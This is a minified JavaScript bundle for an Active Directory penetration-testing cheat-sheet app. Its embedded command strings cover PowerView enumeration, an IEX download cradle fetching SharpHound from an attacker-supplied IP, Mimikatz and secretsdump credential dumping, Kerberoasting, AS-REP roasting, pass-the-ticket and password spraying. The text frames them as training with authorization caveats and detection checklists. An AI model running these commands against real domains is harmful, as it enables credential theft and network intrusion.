import{a as f,b as C,c as w,d as E,e as k,f as M,g as O,h as _}from"./chunk-4Y2KKK2F.js";import"./chunk-BSVWT34Q.js";import{Da as a,F as h,T as i,Ta as S,Ua as y,Xa as P,Za as b,_ as g,ca as x,ja as o,ka as n,la as e,ma as r,qa as l,ra as m,ta as v,ua as d,y as u}from"./chunk-VZSFBBH7.js";function I(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Windows Commands"),e(),n(3,"p",11),a(4," Use built-in Windows commands to enumerate domain users and groups. These commands are a useful starting point when working from a domain-joined Windows machine. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Domain Users"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"Domain Groups"),e()(),r(14,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.windowsUsers),i(5),o("command",t.windowsGroups)}}function R(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"PowerView"),e(),n(3,"p",11),a(4," PowerView provides PowerShell functions for querying Active Directory. Use it to map the domain, enumerate accounts and inspect group memberships. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Import & Domain Information"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"User Enumeration"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Group Enumeration"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.powerViewImport),i(5),o("command",t.powerViewUsers),i(5),o("command",t.powerViewGroups)}}function L(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Manual Enumeration"),e(),n(3,"p",11),a(4," Map domain computers, identify operating systems, discover where the current account has local administrator access and inspect active sessions. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Computers & Operating Systems"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"Local Administrator Access"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Sessions & Logged-on Users"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.manualComputers),i(5),o("command",t.manualLocalAdmin),i(5),o("command",t.manualSessions)}}function N(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"SPN Enumeration"),e(),n(3,"p",11),a(4," Service Principal Names identify services associated with domain accounts. Enumerating them can help identify accounts that warrant further assessment, including potential Kerberoasting exposure. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Enumerate SPNs with setspn"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"Enumerate SPNs with PowerView"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"DNS Lookup"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.spnSetspn),i(5),o("command",t.spnPowerView),i(5),o("command",t.spnDns)}}function W(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Object Permissions"),e(),n(3,"p",11),a(4," Active Directory ACLs control which security principals can read or modify objects. Review delegated rights carefully to identify potentially significant permissions. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Common Permission Types"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"Enumerate Object ACLs"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Find GenericAll Permissions"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),a(23,"Group Membership Changes"),e()(),r(24,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.aclRights),i(5),o("command",t.aclEnumeration),i(5),o("command",t.aclGenericAll),i(5),o("command",t.aclGroupMembership)}}function T(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Domain Shares"),e(),n(3,"p",11),a(4," Enumerate domain shares and review accessible files for configuration data, scripts or other information relevant to the assessment. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Share Enumeration"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"Access SYSVOL"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"GPP Passwords"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.sharesEnumeration),i(5),o("command",t.sharesAccess),i(5),o("command",t.sharesGpp)}}function H(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"BloodHound / SharpHound"),e(),n(3,"p",11),a(4," SharpHound collects Active Directory data. BloodHound visualizes the relationships between users, groups, computers, permissions and sessions to help identify potential attack paths. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Overview & Useful Queries"),e()(),r(9,"app-terminal",12)(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),a(14,"Download SharpHound"),e()(),r(15,"app-terminal",12),e(),n(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),a(19,"SharpHound Collection (Windows)"),e()(),r(20,"app-terminal",12),e(),n(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),a(24,"PowerShell Collection"),e()(),r(25,"app-terminal",12),e(),n(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),a(29,"Start BloodHound (Kali)"),e()(),r(30,"app-terminal",12),e(),n(31,"mat-expansion-panel")(32,"mat-expansion-panel-header")(33,"mat-panel-title"),a(34,"Transfer Results from Evil-WinRM"),e()(),r(35,"app-terminal",12),e(),n(36,"p",11),a(37," After collecting the data, import the generated ZIP into BloodHound. Authenticate to the configured database and use the available analysis queries to explore the collected relationships. "),e(),m()),s&2){let t=d();i(9),o("command",t.bloodhoundOverview),i(),o("command",t.bloodhoundQueries),i(5),o("command",t.sharpHoundDownload),i(5),o("command",t.sharpHoundCollection),i(5),o("command",t.sharpHoundPowerShell),i(5),o("command",t.bloodhoundKali),i(5),o("command",t.bloodhoundTransfer)}}function z(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Credential Access"),e(),n(3,"p",11),a(4," Assess where Windows stores authentication material, identify the privileges required to access it, and understand the impact of exposed credentials in an authorized environment. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Security Context & Logged-on Users"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"LSASS & Logon Credentials"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Cached Domain Credentials"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),a(23,"Local SAM Database"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),a(28,"LSA Secrets"),e()(),r(29,"app-terminal",12),e(),n(30,"mat-expansion-panel")(31,"mat-expansion-panel-header")(32,"mat-panel-title"),a(33,"Credential Manager & Windows Vault"),e()(),r(34,"app-terminal",12),e(),n(35,"mat-expansion-panel")(36,"mat-expansion-panel-header")(37,"mat-panel-title"),a(38,"DPAPI"),e()(),r(39,"app-terminal",12),e(),n(40,"mat-expansion-panel")(41,"mat-expansion-panel-header")(42,"mat-panel-title"),a(43,"Domain Controller Credential Exposure"),e()(),r(44,"app-terminal",12),e(),n(45,"mat-expansion-panel")(46,"mat-expansion-panel-header")(47,"mat-panel-title"),a(48,"Credential Hunting Workflow"),e()()(),m()),s&2){let t=d();i(9),o("command",t.attackCredentialOverview),i(5),o("command",t.attackLsass),i(5),o("command",t.attackCachedCredentials),i(5),o("command",t.attackSam),i(5),o("command",t.attackLsaSecrets),i(5),o("command",t.attackCredentialManager),i(5),o("command",t.attackDpapi),i(5),o("command",t.attackNtds)}}function G(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Kerberos Attacks"),e(),n(3,"p",11),a(4," Understand Kerberos authentication, identify accounts exposed to ticket-based attacks, and assess the security of service accounts and ticket handling. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"AS-REP Roasting"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"Kerberoasting"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Ticket Enumeration"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),a(23,"Pass-the-Ticket"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),a(28,"Silver Tickets"),e()(),r(29,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.attackAsrep),i(5),o("command",t.attackKerberoast),i(5),o("command",t.attackTicketEnumeration),i(5),o("command",t.attackPassTheTicket),i(5),o("command",t.attackSilverTicket)}}function U(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Password Attacks"),e(),n(3,"p",11),a(4," Assess password policy and authentication weaknesses while respecting account lockout thresholds, test scope and approved authentication-attempt limits. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"Password & Lockout Policy"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"LDAP & ADSI Authentication"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Password Spraying"),e()(),r(19,"app-terminal",12),e(),n(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),a(23,"SMB Authentication \u2014 Kali"),e()(),r(24,"app-terminal",12),e(),n(25,"mat-expansion-panel")(26,"mat-expansion-panel-header")(27,"mat-panel-title"),a(28,"Kerbrute \u2014 Authentication Testing"),e()(),r(29,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.attackPasswordPolicy),i(5),o("command",t.attackCredentialValidation),i(5),o("command",t.attackPasswordSpray),i(5),o("command",t.attackSmbValidation),i(5),o("command",t.attackKerbrute)}}function j(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Domain Compromise"),e(),n(3,"p",11),a(4," Evaluate high-impact Active Directory privileges, understand directory replication abuse, and document the exposure and remediation of privileged credentials. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"DCSync Prerequisites"),e()(),r(9,"app-terminal",12),e(),n(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),a(13,"DCSync Detection & Remediation"),e()(),r(14,"app-terminal",12),e(),n(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),a(18,"Post-Compromise Checklist"),e()(),r(19,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.attackDcsyncRequirements),i(5),o("command",t.attackDcsyncDetection),i(5),o("command",t.attackPostCompromise)}}function V(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"AD Set Flow"),e(),n(3,"p",11),a(4," Follow a structured Active Directory workflow, from port scanning and initial access to privilege escalation, post-compromise enumeration and pivoting. "),e(),n(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),a(8,"01. Scan & Service Enumeration"),e()(),r(9,"app-terminal",12)(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),a(14,"02. Access to the Server"),e()(),r(15,"app-terminal",12)(16,"app-terminal",12),e(),n(17,"mat-expansion-panel")(18,"mat-expansion-panel-header")(19,"mat-panel-title"),a(20,"03. Domain & Host Enumeration"),e()(),r(21,"app-terminal",12)(22,"app-terminal",12)(23,"app-terminal",12)(24,"app-terminal",12)(25,"app-terminal",12)(26,"app-terminal",12)(27,"app-terminal",12),e(),n(28,"mat-expansion-panel")(29,"mat-expansion-panel-header")(30,"mat-panel-title"),a(31,"04. Privilege Escalation"),e()(),r(32,"app-terminal",12)(33,"app-terminal",12),e(),n(34,"mat-expansion-panel")(35,"mat-expansion-panel-header")(36,"mat-panel-title"),a(37,"05. Post-Compromise Workflow"),e()(),r(38,"app-terminal",12)(39,"app-terminal",12)(40,"app-terminal",12)(41,"app-terminal",12),e(),n(42,"mat-expansion-panel")(43,"mat-expansion-panel-header")(44,"mat-panel-title"),a(45,"06. Pivoting with Ligolo-ng"),e()(),r(46,"app-terminal",12)(47,"app-terminal",12),e(),n(48,"mat-expansion-panel")(49,"mat-expansion-panel-header")(50,"mat-panel-title"),a(51,"07. Post-Pivoting Enumeration"),e()(),r(52,"app-terminal",12),e(),m()),s&2){let t=d();i(9),o("command",t.flowScan),i(),o("command",t.flowServices),i(5),o("command",t.flowWinRM),i(),o("command",t.flowHostEnumeration),i(5),o("command",t.manualComputers),i(),o("command",t.manualLocalAdmin),i(),o("command",t.manualSessions),i(),o("command",t.spnSetspn),i(),o("command",t.spnPowerView),i(),o("command",t.spnDns),i(),o("command",t.aclRights),i(5),o("command",t.flowPrivEscChecks),i(),o("command",t.flowPrivEscReview),i(5),o("command",t.flowPostCompromise),i(),o("command",t.flowCredentialAudit),i(),o("command",t.flowKerberosAudit),i(),o("command",t.flowMssqlAudit),i(5),o("command",t.flowPivotEnumeration),i(),o("command",t.flowLigolo),i(5),o("command",t.flowPostPivot)}}function q(s,c){if(s&1&&(l(0),n(1,"h2"),a(2,"Full AD Compromise from Linux"),e(),n(3,"p"),a(4," Structured Active Directory assessment workflow using Kali Linux. Perform these steps only in systems you are authorized to test. "),e(),n(5,"mat-accordion",13)(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),a(9,"Phase 0 \u2013 Initial Scan"),e()(),r(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),a(14,"Phase 1 \u2013 Enumeration Without Credentials"),e()(),r(15,"app-terminal",12),e(),n(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),a(19,"Phase 2 \u2013 Enumeration With Credentials"),e()(),r(20,"app-terminal",12),e(),n(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),a(24,"Phase 3 \u2013 Lateral Movement"),e()(),r(25,"app-terminal",12),e(),n(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),a(29,"Phase 4 \u2013 Credential Dumping"),e()(),r(30,"app-terminal",12),e()(),m()),s&2){let t=d();i(10),o("command",t.linuxAdInitialScan),i(5),o("command",t.linuxAdNoCredentials),i(5),o("command",t.linuxAdWithCredentials),i(5),o("command",t.linuxAdLateralMovement),i(5),o("command",t.linuxAdCredentialDumping)}}var A=class s{selectedService="full-ad-compromise-linux";sections=[{id:"full-ad-compromise-linux",label:"Kali Single-Host Flow",group:"AD Flow"},{id:"ad-flow",label:"Windows Pivot Flow",group:"AD Flow"},{id:"windows",label:"Windows Commands",group:"Enumeration"},{id:"powerview",label:"PowerView",group:"Enumeration"},{id:"manual",label:"Manual Enumeration",group:"Enumeration"},{id:"spn",label:"SPN Enumeration",group:"Enumeration"},{id:"acl",label:"Object Permissions",group:"Enumeration"},{id:"shares",label:"Domain Shares",group:"Enumeration"},{id:"bloodhound",label:"BloodHound",group:"Enumeration"},{id:"credentials",label:"Credential Access",group:"Attacking"},{id:"kerberos",label:"Kerberos Attacks",group:"Attacking"},{id:"passwords",label:"Password Attacks",group:"Attacking"},{id:"compromise",label:"Domain Compromise",group:"Attacking"},{id:"planned-privesc",label:"Privilege Escalation",group:"Coming later",disabled:!0},{id:"planned-post-exploitation",label:"Post-Exploitation",group:"Coming later",disabled:!0}];route=u(P);router=u(b);destroyRef=u(h);ngOnInit(){this.route.queryParamMap.pipe(M(this.destroyRef)).subscribe(c=>{let t=c.get("service");t&&this.sections.some(p=>p.id===t&&!p.disabled)&&(this.selectedService=t)})}selectService(c){this.selectedService=c,this.router.navigate([],{relativeTo:this.route,queryParams:{service:c},replaceUrl:!0})}clearService(){this.selectedService="full-ad-compromise-linux"}windowsUsers=`
# List users in the domain
net user /domain

# Get information about a specific domain user
net user <username> /domain
`;windowsGroups=`
# List domain groups
net group /domain

# Enumerate a specific domain group
net group "Sales Department" /domain
`;powerViewImport=`
# Import PowerView
Import-Module .\\PowerView.ps1

# Get basic domain information
Get-NetDomain
`;powerViewUsers=`
# List domain users
Get-NetUser

# Display common names
Get-NetUser | Select-Object cn

# Display password and logon information
Get-NetUser | Select-Object cn,pwdlastset,lastlogon
`;powerViewGroups=`
# List domain groups
Get-NetGroup

# Display group names
Get-NetGroup | Select-Object cn

# Enumerate members of a specific group
Get-NetGroup "Sales Department" | Select-Object member
`;manualComputers=`
# Enumerate domain computers
Get-NetComputer

# Identify operating systems and hostnames
Get-NetComputer | Select-Object operatingsystem,dnshostname

# Include operating system versions
Get-NetComputer | Select-Object operatingsystem,dnshostname,operatingsystemversion
`;manualLocalAdmin=`
# Find systems where the current user has local admin access
Find-LocalAdminAccess
`;manualSessions=`
# Query sessions on a named domain computer such as files04
Get-NetSession -ComputerName <name> -Verbose

# Example: query files04
Get-NetSession -ComputerName files04 -Verbose

# List logged-on users with PsLoggedOn
.\\PsLoggedon.exe \\\\<name>

# Example: query files04
.\\PsLoggedon.exe \\\\files04
`;spnSetspn=`
# List SPNs registered to a user
setspn -L <user>

# Example: inspect the iis_service account
setspn -L iis_service
`;spnPowerView=`
# Find domain users with registered SPNs
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
`;spnDns=`
# Perform a reverse DNS lookup
nslookup.exe <IP>
`;aclRights=`
# GenericAll: Full control over the object
# GenericWrite: Modify object attributes
# WriteOwner: Change the object's owner
# WriteDACL: Modify the object's access control list
# AllExtendedRights: Inspect the specific extended rights
# ForceChangePassword: Reset a user's password
# Self: Perform permitted self-membership or attribute changes
`;aclEnumeration=`
# Enumerate permissions on a user object
Get-ObjectAcl -Identity <user>

  # Example: inspect the stephanie user object
Get-ObjectAcl -Identity stephanie

# Convert a SID to a name
Convert-SidToName <ObjectSID>
`;aclGenericAll=`
# Find GenericAll permissions on a group
Get-ObjectAcl -Identity "Management Department" |
  Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} |
  Select-Object SecurityIdentifier,ActiveDirectoryRights
`;aclGroupMembership=`
# Add a user to a domain group
net group "Management Department" stephanie /add /domain

# Verify group membership
Get-NetGroup "Management Department" | Select-Object member

# Remove the user from the group
net group "Management Department" stephanie /delete /domain
`;sharesEnumeration=`
# Discover domain shares
Find-DomainShare

# Check which shares are accessible
Find-DomainShare -CheckShareAccess
`;sharesAccess=`
# List the contents of a SYSVOL path
Get-ChildItem \\\\dc1.corp.com\\sysvol\\corp.com\\
`;sharesGpp=`
# Decrypt a Group Policy Preferences password hash
gpp-decrypt <password>
`;bloodhoundOverview=`
# SharpHound collects Active Directory relationship data.
# BloodHound visualizes relationships and potential attack paths.

# Useful analysis goals:
# - Shortest path to Domain Admin
# - Misconfigured object permissions (ACLs)
# - Local administrator relationships
# - Session-based attack paths
# - Kerberoastable and AS-REP roastable users
`;sharpHoundDownload=`
# Download and load the PowerShell collector
IEX (New-Object Net.WebClient).DownloadString(
  'http://<IP>/SharpHound.ps1'
)

# Alternative: download the executable using certutil
certutil -urlcache -f http://<IP>/SharpHound.exe SharpHound.exe

# Alternative: download a file using PowerShell
Invoke-WebRequest -Uri http://<IP>/SharpHound.exe \`
  -OutFile SharpHound.exe
`;sharpHoundCollection=`
# Collect supported data using SharpHound
.\\SharpHound.exe -c All

# Save the output to a specific directory
.\\SharpHound.exe -c All --outputdirectory C:\\Temp

# Specify the target domain
.\\SharpHound.exe -c All -d resourced.local
`;sharpHoundPowerShell=`
# Import the PowerShell collector
Import-Module .\\SharpHound.ps1

# Review available parameters
Get-Help Invoke-BloodHound

# Collect data and specify the output directory
Invoke-BloodHound -CollectionMethod All \`
  -OutputDirectory C:\\Users\\user\\Desktop \`
  -OutputPrefix "domain audit"
`;bloodhoundKali=`
# Start the Neo4j database service
sudo neo4j start

# Launch BloodHound
bloodhound
`;bloodhoundTransfer=`
# From an Evil-WinRM session, download the collected ZIP
download 20240504120000_BloodHound.zip
`;bloodhoundQueries=`
# Useful BloodHound analysis goals

# Shortest Path to Domain Admin
# Find Local Admin Rights
# Find Kerberoastable Users
# Find AS-REP Roastable Users
# Find Sessions (Logged-on Users)
`;attackCredentialOverview=`
# Identify the current security context
whoami
whoami /all

# Inspect interactive sessions
query user
qwinsta

# Inspect Kerberos tickets
klist

# Credential-access assessment checklist
# - Current user privileges
# - Local administrator or SYSTEM access
# - Logged-on privileged accounts
# - Accessible credential stores
# - Windows security protections
`;attackLsass=`
# Mimikatz: credential material in LSASS
# Use only in an authorized lab with appropriate privileges.

.\\mimikatz.exe

# Within the Mimikatz console
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::tickets
sekurlsa::ekeys

# Results depend on Windows protections, logon state
# and the privileges of the current process.
`;attackCachedCredentials=`
# In an elevated Mimikatz console, inspect cached domain logons
lsadump::cache

# DCC2 / MS Cache v2 is not an NTLM hash.
# Offline password auditing with Hashcat:
hashcat -m 2100 hashes.txt /path/to/wordlist.txt

# John the Ripper:
john --format=mscash2 hashes.txt
`;attackSam=`
# Save local registry hives (requires appropriate privileges)
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze the exported hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# SAM contains local account hashes, not all domain hashes.
`;attackLsaSecrets=`
# In a Mimikatz console, inspect LSA secrets
lsadump::secrets

# Inspect local SAM hashes in the same console
lsadump::sam

# LSA secrets may contain service-related or machine-account
# material depending on the system configuration.
`;attackCredentialManager=`
# Enumerate credentials visible to the current user
cmdkey /list

# Inspect current Kerberos tickets
klist

# Mimikatz commands for an authorized lab
sekurlsa::credman
vault::cred

# Results depend on Windows version, logon session
# and the current security context.
`;attackDpapi=`
# In a Mimikatz console, inspect DPAPI material in memory
sekurlsa::dpapi

# DPAPI can protect browser data, application secrets
# and Credential Manager data.
#
# Recovering a master key does not automatically decrypt
# every protected file. Additional key material may be needed.
`;attackNtds=`
# Assess domain-controller credential exposure.
# Requires valid authentication and appropriate privileges.

# Remote assessment of a single account
impacket-secretsdump -just-dc-user <username> <domain>/<user>@<dc-ip>

# Use a lab account and the actual domain-controller address.
# Ordinary domain-user credentials are not sufficient by themselves.
`;attackAsrep=`
# Kali: request AS-REP material for accounts without
# Kerberos preauthentication (authorized lab)
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat -outputfile asrep.txt

# Offline audit with Hashcat
hashcat -m 18200 asrep.txt /path/to/wordlist.txt

# Windows: Rubeus
.\\Rubeus.exe asreproast /nowrap

# Only accounts configured without preauthentication
# are susceptible to this technique.
`;attackKerberoast=`
# Kali: request service-ticket hashes for SPN accounts
impacket-GetUserSPNs <domain>/<user> -dc-ip <dc-ip> -request -outputfile kerberoast.txt

# Offline audit (Hashcat mode depends on hash type)
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt

# Windows: Rubeus
.\\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Review account privilege, SPN ownership and password strength.
`;attackTicketEnumeration=`
# List tickets in the current Windows logon session
klist

# Mimikatz: inspect tickets in LSASS
sekurlsa::tickets

# Rubeus: enumerate ticket metadata
.\\Rubeus.exe triage

# Exporting or accessing tickets requires appropriate access.
# Protect exported .kirbi files as sensitive credentials.
`;attackPassTheTicket=`
# Rubeus ticket operations require an authorized lab
# and a valid ticket belonging to the test environment.

# Inspect tickets
klist

# Rubeus ticket import syntax
.\\Rubeus.exe ptt /ticket:<ticket-file.kirbi>

# Verify the current session's ticket cache
klist

# A ticket does not automatically grant access to every host:
# the service, identity, validity and permissions must match.
`;attackSilverTicket=`
# Silver Ticket concepts

# A service ticket is forged using the target service account's
# key material, plus domain and service-specific information.

# Assessment prerequisites:
# - Authorized access to the relevant service-account key
# - Correct domain SID and service SPN
# - Understanding of service-side validation and privileges

# Validate exposure and remediate weak service-account passwords.
# Avoid creating forged tickets outside a controlled lab.
`;attackPasswordPolicy=`
# Inspect domain password and lockout policy
net accounts /domain

# Inspect local account policy
net accounts

# Review:
# - Lockout threshold
# - Lockout duration
# - Observation window
# - Password length and complexity
#
# Confirm the approved testing limits before authentication tests.
`;attackCredentialValidation=`
# Resolve the current domain, PDC and base DN for an LDAP test.
# This snippet does not bind or validate credentials.

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $domainObj.PdcRoleOwner.Name
$dn = "DC=" + $domainObj.Name.Replace(".", ",DC=")
$path = "LDAP://$pdc/$dn"

# Perform any credential bind separately with authorized lab credentials.
# Do not hardcode passwords in scripts or command history.
`;attackPasswordSpray=`
# Password spraying tests one approved candidate password
# against a controlled set of test accounts.
#
# Before testing:
# 1. Obtain explicit authorization.
# 2. Review lockout policy and approved attempt limits.
# 3. Use designated lab accounts.
# 4. Monitor authentication logs.
#
# Do not run a spray against an unspecified or production domain.
`;attackSmbValidation=`
# Validate a known lab credential against an authorized SMB host
# with NetExec (success does not necessarily mean admin access).

nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>'

# Enumerate shares when authorized
nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares

# Review authentication status, privileges and share permissions.
`;attackKerbrute=`
# Kerbrute password spraying syntax for a controlled lab
# Confirm lockout policy and test scope first.

kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt '<lab-password>'

# Stop if authentication errors or lockout indicators appear.
# Prefer dedicated test accounts and an agreed attempt limit.
`;attackDcsyncRequirements=`
# DCSync abuses directory replication permissions.
# It does not require an interactive login to the DC, but
# the account must have the relevant replication rights.

# Review effective permissions for:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes In Filtered Set (where relevant)

# Investigate unexpected principals with replication privileges.
`;attackDcsyncDetection=`
# Detection and validation checklist

# - Review directory replication events and domain-controller logs.
# - Investigate replication requests from unusual hosts/accounts.
# - Audit privileged group membership and delegated ACLs.
# - Remove unnecessary replication rights.
# - Rotate exposed credentials and assess krbtgt remediation
#   with the domain administrator.
#
# Event availability depends on audit policy and Windows version.
`;attackPostCompromise=`
# Post-assessment checklist

1. Record the account and credential type discovered.
2. Identify the exact privileges and affected systems.
3. Avoid using recovered credentials beyond the approved scope.
4. Protect evidence and redact secrets in reports.
5. Notify the system owner of critical credential exposure.
6. Recommend credential rotation and least-privilege remediation.
7. Remove temporary files and tools according to the engagement plan.
`;flowScan=`
# Full TCP port scan
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN openPorts

# Review discovered ports
cat openPorts
`;flowServices=`
# Enumerate discovered services and default scripts
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN services

# Common Active Directory ports
# 53    DNS
# 88    Kerberos
# 135   MSRPC
# 139   NetBIOS
# 389   LDAP
# 445   SMB
# 464   Kerberos password change
# 636   LDAPS
# 3268  Global Catalog
# 3389  RDP
# 5985  WinRM
# 1433  MSSQL
`;flowWinRM=`
# Connect to an authorized lab host using valid credentials
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
`;flowHostEnumeration=`
# Identify the current user and security context
whoami
whoami /all
whoami /priv
whoami /groups

# Identify the host
hostname
systeminfo

# Review network configuration
ipconfig /all
route print

# Review local users and groups
net user
net localgroup
net localgroup Administrators
`;flowPrivEscChecks=`
# Check current security privileges
whoami /priv
whoami /groups

# Review operating system details
systeminfo

# Inspect services
Get-Service

# Review scheduled tasks
schtasks /query /fo LIST /v
`;flowPrivEscReview=`
# Privilege escalation review checklist
# 1. Identify enabled token privileges.
# 2. Review service permissions and service paths.
# 3. Inspect scheduled tasks and their permissions.
# 4. Check writable directories and executable paths.
# 5. Review installed software and applicable patches.
# 6. Search for exposed configuration files and credentials.
# 7. Validate each finding only in the authorized lab.
# 8. Record evidence and the resulting security context.
`;flowPostCompromise=`
# Confirm the current identity and privilege level
whoami
whoami /all

# Review local administrators
net localgroup Administrators

# Review domain groups
net group /domain

# Review domain users
net user /domain

# Review current logon sessions
query user
qwinsta

# Inspect locally available Kerberos tickets
klist
`;flowCredentialAudit=`
# Credential exposure assessment
# Review the following sources within the authorized scope:
#
# - Application configuration files
# - Scripts containing embedded credentials
# - PowerShell history
# - Windows services and scheduled task configurations
